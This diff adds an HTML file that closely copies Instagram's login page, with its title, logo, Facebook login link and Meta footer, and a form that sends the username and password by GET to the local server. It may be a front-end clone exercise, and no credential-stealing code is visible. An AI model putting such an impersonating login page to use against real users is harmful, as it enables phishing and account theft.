@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.5.1/css/all.css">
+    <link rel="icon" href="public/images/instaIcon.png" type="image/x-icon">
+    <title>Login • Instagram</title>
+</head>
+<body>
+    <div class="top">
+        <form action="/" method="get">
+            <div class="logo">
+                <img src="public/images/logo.png" alt="Instagram Logo">
+            </div>
+            <div class="inputs">
+                <div class="usernameBox">
+                    <input type="text" name="usernameORpassword" class="username">
+                    <span class="userPlaceHolder" id="userPlaceHolder">Phone number, username, or email</span>
+                </div>
+                <div class="passwordBox">
+                    <input type="password" name="password" class="password">
+                    <div class="outline"></div>
+                    <p id="handlePass">Show</p>
+                    <span class="passPlaceHolder" id="passPlaceHolder">Password</span>
+                </div>
+            </div>
+            <button type="submit" class="submitBtn" id="submitBtn">Log in</button>
+            <div class="space">
+                <h3 class="or">OR</h3>
+            </div>
+            <div class="options">
+                <a class="facebookBox" href="https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%252214cflalhobdxz1885y90u6incub0dbevirgh8q1f4acf71s2wxcn%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8aac7cd7-bd76-4cda-8a9a-c1e1dd700c1e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252214cflalhobdxz1885y90u6incub0dbevirgh8q1f4acf71s2wxcn%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated&_rdr">
+                    <i class="fa-brands fa-square-facebook"></i>
+                    <span class="facebook">Log in with Facebook</span>
+                </a>
+                <a href="https://www.instagram.com/accounts/password/reset/" class="forgetPassword">Forgot password?</a>
+            </div>
+        </form>
+        <div class="unAccount">
+            <h3>Don't have an account?<a class="signup" href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></h3>
+        </div>
+        <div class="app">
+            <h3>Get the app.</h3>
+            <div class="icons">
+                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="public/images/appStore.png" alt="App Store download"/></a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DBCECFCAE-D39F-40F3-B467-78B5AB3D0FF0%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps%3A%2F%2Fwww.google.com%2F"><img src="public/images/googlePlay.png" alt="Google Play Downlaod"></a>
+            </div>
+        </div>
+    </div>
+    <div class="bottom">
+        <div class="dirs">
+            <a href="https://about.meta.com/" class="line">Meta</a>
+            <a href="https://about.instagram.com/" class="line">About</a>
+            <a href="https://about.instagram.com/blog" class="line">Blog</a>
+            <a href="https://about.instagram.com/about-us/careers">Jobs</a>
+            <a href="https://help.instagram.com/" class="line">Help</a>
+            <a href="https://developers.facebook.com/docs/instagram" class="line">Api</a>
+            <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a>
+            <a href="https://help.instagram.com/581066165581870/">Terms</a>
+            <a href="https://www.instagram.com/explore/locations/">Locations</a>
+            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+            <a href="https://www.threads.net/login" class="line">Threads</a>
+            <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
+            <a href="https://about.meta.com/technologies/meta-verified/" class="line">Meta verified</a>
+        </div>
+        <div class="copyWrite">
+            <a href="">
+                English
+                <i class="fa-regular fa-angle-down"></i>
+            </a>
+            <h3>&copy; 2023 Instagram from Meta</h3>
+        </div>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
